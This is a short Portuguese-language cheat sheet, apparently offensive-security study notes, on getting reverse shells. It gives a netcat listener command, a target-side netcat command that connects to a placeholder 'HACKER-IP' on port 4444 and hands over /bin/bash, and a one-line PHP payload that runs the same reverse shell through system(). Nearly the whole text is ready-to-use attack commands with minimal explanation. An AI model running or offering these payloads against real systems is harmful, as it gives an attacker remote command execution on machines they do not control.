# 🥟 Shells

## Shell reverso utilizando Netcat

### Na máquina atacante

Executar o netcat para ouvir uma conexão na portar 4444

```
nc -nvlp 4444
```

### Na máquina alvo

Executa do netcat para se conextar à máquina Kali na porta 4444, executa e envia o bash de comando.

```
nc HACKER-IP 4444 -e /bin/bash
```



Shell reverso utilizando o PHP

Executa o script .php no host para estabelecer uma conexão reversa para a máquina do atacante na porta 4444 e enviar o bash de comando.

```
<?php system('nc HACKER-IP 4444 -e /bin/bash')?>
```





